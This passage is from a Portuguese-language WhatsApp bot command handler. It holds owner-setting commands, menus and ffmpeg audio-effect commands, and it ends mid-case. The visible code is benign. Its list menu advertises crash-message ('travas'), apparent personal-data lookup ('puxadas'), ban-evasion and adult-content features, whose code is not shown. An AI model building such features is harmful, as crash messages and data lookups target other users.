//========INÍCIO DAS CASES=============


switch(command) {

    case 'donos':
        dono = `donos da ${NomeDoBot}\nDono oficial: ${donooriginal[0]}\nTotal : ${numerodonos.length}\n╭⸺⩫⸺⃙❀\n`
        no = 0
        for (let donos of numerodonos) {
            no += 1
            dono += `┣❲${no.toString()}❳=❲@${donos.split('@')[0]}\n`
        }
        dono += `╰⸺⩫⸺⃙❀`
        await nezuko.sendMessage(from, { text: dono.trim(), contextInfo: { "mentionedJid": numerodonos } }, { quoted: m })
        break
    case 'dono2':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono2 = body.slice(8)
        nescessario.dono2 = dono2
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono2}`)
        break

    case 'dono3':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono3 = body.slice(8)
        nescessario.dono3 = dono3
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um terceiro dono(a) alterado com sucesso para: ${dono3}`)
        break

    case 'dono4':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono4 = body.slice(8)
        nescessario.dono4 = dono4
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um quarto dono(a) alterado com sucesso para: ${dono4}`)
        break

    case 'dono5':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono5 = body.slice(8)
        nescessario.dono5 = dono5
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono5}`)
        break

    case 'dono6':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono6 = body.slice(8)
        nescessario.dono6 = dono6
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um sexto dono(a) alterado com sucesso para: ${dono6}`)
        break

    case 'dono7':
        if (args.length < 1) return
        if (!isDonoori) return reply('Apenas meu criador')
        dono7 = body.slice(8)
        nescessario.dono7 = dono7
        fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
        reply(`Agora contem um setimo dono(a) alterado com sucesso para: ${dono7}`)
        break
//========MENUS=============

case 'menu':
var bio= await nezuko.fetchStatus(m.sender)
var bioo = bio.status

sendBimg(from, `${logo}`, menu(prefix, pushname, numerodn, bioo, NomeDoBot, `Wa.me/${sender.split('@')[0]}`), `ж☬ˢLᎾᏒᎠᎬ༻꧂`, 
[{buttonId: `${prefix}menulist`, buttonText: {displayText: `[🦅] 𝐌𝐄𝐍𝐔 𝐋𝐈𝐒𝐓 [🦅]`}, type: 1},
{buttonId: `${prefix}alugar`, buttonText: {displayText: `[🚬️] 𝐀𝐋𝐔𝐆𝐀𝐑 [🥃]`}, type: 1},
{buttonId: `${prefix}dono`, buttonText: {displayText: `[💸️] 𝐃𝐎𝐍𝐎 [💸]`}, type: 1}], dnselo)
break 

case 'menulist': case 'menulista': {
	timestampe = speed();
qlatensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿",
rows: [
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐎⩩⃟🦅", rowId: `${prefix}menu`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐋𝐎𝐆𝐎𝐒⩩⃟🦅̶", rowId: `${prefix}menulogos`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐈𝐍𝐅𝐎 𝐃𝐎𝐍𝐎⩩⃟🦅", rowId: `${prefix}infodono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐃𝐎𝐍𝐎⩩⃟🦅̶", rowId: `${prefix}menudono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐒𝐓𝐈𝐂𝐊𝐄𝐑⩩⃟🦅̶", rowId: `${prefix}menufig`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅#𝐌𝐄𝐍𝐔 𝐀𝐃𝐌⩩⃟🦅̶", rowId: `${prefix}menuadm`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐄𝐃𝐈𝐓𝐒 𝟐⩩⃟🦅̶", rowId: `${prefix}menuedit2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐍𝐀𝐑𝐔𝐓𝐎⩩⃟🦅̶", rowId: `${prefix}menunaruto`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐌𝐔́𝐒𝐈𝐂𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}menumusica`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}bricadeiras`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒 𝟐⩩⃟🦅", rowId: `${prefix}menubrinc2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐉𝐎𝐆𝐎𝐒⩩⃟🦅", rowId: `${prefix}menujogos`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}menu-pesquisas`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐄𝐅𝐄𝐈𝐓𝐎𝐒⩩⃟🦅̶", rowId: `${prefix}menuefeito`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐏𝐑𝐄𝐌𝐈𝐔𝐌⩩⃟🦅̶", rowId: `${prefix}menupremium`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒⩩⃟🦅̶", rowId: `${prefix}alteradores`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐆𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒⩩⃟🦅̶", rowId: `${prefix}geradores`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐂𝐎𝐍𝐓𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}menuger`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐈𝐌𝐈𝐓𝐀𝐂̧𝐎̃𝐄𝐒⩩⃟🦅̶", rowId: `${prefix}imitações`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐅𝐔𝐍𝐂̧𝐎̃𝐄𝐒/𝐆𝐑𝐔𝐏𝐎⩩⃟🦅̶", rowId: `${prefix}funções-grupo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐆𝐑𝐔𝐏𝐎 𝐃𝐎 𝐁𝐎𝐓⩩⃟🦅̶", rowId: `${prefix}suporte-grupo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐂𝐌𝐃 𝐒𝐄𝐌 𝐏𝐑𝐄𝐅𝐈𝐗𝐎⩩⃟🦅", rowId: `${prefix}semprefixo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐒𝐆 𝐒𝐄𝐌 𝐏𝐑𝐄𝐅𝐈𝐗𝐎⩩⃟🦅̶", rowId: `${prefix}msgsemprefixo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐀𝐍𝐈𝐌𝐄⩩⃟🦅̶", rowId: `${prefix}menuanime`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐋𝐈𝐒𝐓𝐀 𝐉𝐎𝐆𝐎𝐒/𝐀𝐏𝐊⩩⃟🦅̶", rowId: `${prefix}listajogos`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐋𝐈𝐒𝐓𝐀 𝐀𝐏𝐏𝐒⩩⃟🦅̶", rowId: `${prefix}appspremium`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐅𝐈𝐋𝐌𝐄⩩⃟🦅", rowId: `${prefix}menufilme`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐒𝐄́𝐑𝐈𝐄𝐒⩩⃟🦅̶", rowId: `${prefix}menuserie`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐓𝐑𝐀𝐕𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}menutravas`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐃𝐄𝐒𝐓𝐑𝐀𝐕𝐀𝐒⩩⃟🦅̶", rowId: `${prefix}menudestrava`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐏𝐔𝐗𝐀𝐃𝐀𝐒⩩⃟🦅", rowId: `${prefix}menupuxadas`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐇𝐄𝐍𝐓𝐀𝐈⩩⃟🦅̶", rowId: `${prefix}menu-hentai`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐋𝐈𝐒𝐓𝐀 𝐀𝐍𝐈𝐌𝐄𝐒⩩⃟🦅̶", rowId: `${prefix}menu-anime`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⩩𝐌𝐄𝐍𝐔 𝐏𝐀𝐂𝐊⩩⃟🦅̶", rowId: `${prefix}menupack`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐏𝐋𝐀𝐂𝐀𝐒⩩⃟🦅", rowId: `${prefix}menuplaq`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑𝐒⩩⃟🦅", rowId: `${prefix}menuwall`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐌𝐄́𝐓𝐎𝐃𝐎 𝐃𝐄𝐒𝐁𝐀𝐍⩩⃟🦅̶", rowId: `${prefix}banmtd`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂?⃝🦅̶⃙ >3"},
{title: "🦅⃟̶⩩𝐌𝐄𝐍𝐔 𝐒𝐔𝐏𝐎𝐑𝐓𝐄𝐒⩩⃟🦅", rowId: `${prefix}suporte`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "🦅⃟̶⩩𝐋𝐈𝐍𝐊 𝐃𝐄 𝐁𝐎𝐓𝐒⩩⃟🦅̶", rowId: `${prefix}bases`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
]
},
]
 

const listMessage2 = {
text: `
Sᴇʟᴇᴄɪᴏɴᴇ O Mᴇɴᴜ Dᴇsᴇᴊᴀᴅᴏ
`,
  footer: `© Cᴏᴘʏʀɪɢʜᴛ Bʏ ж☬ˢLᎾᏒᎠᎬ༻꧂`,
  title: `Mᴇɴᴜ Dᴇ Lɪsᴛᴀ `,
  buttonText: "Lɪsᴛᴀ Dᴇ Cᴏᴍᴀɴᴅᴏs",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'menuanime':
case 'menuanimes':
sendBimg(from, `${logo}`, menuanime(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break

case 'menujogo':
case 'menujogos':
sendBimg(from, `${logo}`, menujogos(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menupuxadas':
case 'puxadas':
sendBimg(from, `${logo}`, menupuxadas(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menudestrava':
case 'destravamenu':
sendBimg(from, `${logo}`, menudestrava(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menubrincadeiras2':
case 'menubrinc2':
sendBimg(from, `${logo}`, menubrincadeiras2(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menuadm':
case 'admmenu':
sendBimg(from, `${logo}`, menuadm(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menupremium':
case 'premiummenu':
sendBimg(from, `${logo}`, menupremium(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'mtddeban':
case 'banmtd':
sendBimg(from, `${logo}`, menudesban(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menupack':
case 'menu-packs':
sendBimg(from, `${logo}`, menupack(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menuger':
sendBimg(from, `${logo}`, menugerar(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'geradores':
case 'menugeradores':
sendBimg(from, `${logo}`, menugeradores(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menutravas':
case 'travasmenu':
sendBimg(from, `${logo}`, menutravas(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'semprefixo':
case 'menusemprefixo':
sendBimg(from, `${logo}`, menusemprefixo(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'funções-grupo':
case 'funçõesgrupo':
sendBimg(from, `${logo}`, menugrupo(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'imitações':
sendBimg(from, `${logo}`, menuimitacoes(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menuefeito':
case 'menuefeitos':
sendBimg(from, `${logo}`, menuefeito(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menupesquisas':
case 'menu-pesquisas':
sendBimg(from, `${logo}`, menupesquisa(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menu-bricadeiras':
case 'bricadeiras':
sendBimg(from, `${logo}`, menubrincadeiras(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menumusica':
case 'menuplayers':
sendBimg(from, `${logo}`, menumusica(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menuedit2':
case 'menuedits2':
sendBimg(from, `${logo}`, menuedits2(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menuplaq':
case 'plaquinhas':
sendBimg(from, `${logo}`, menuplaquinhas(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menulogos':
case 'logosmenu':
sendBimg(from, `${logo}`, menulogos(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'infodono':
case 'dono':
case 'owner':
sendBimg(from, `${logo}`, infodono(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menudono':
case 'donomenu':
sendBimg(from, `${logo}`, menudono(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break 

case 'menufig':
case 'figmenu':
sendBimg(from, `${logo}`, menufig(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break

case 'alteradores':
case 'menualteradores':
sendBimg(from, `${logo}`, alteradores(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], dnselo) 
break

//=============ALTERADORES=============\\

case 'tupai':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.5,asetrate=65100"' ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'reverse':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'fat':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'deep':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "atempo=4/4,asetrate=44500*2/3" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'vozmenino':  
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break  

case 'grave':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'grave2':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'bass': 
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'bass2': 
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nezuko.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: dnselo})
fs.unlinkSync(ran)
})
break

case 'bass3':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
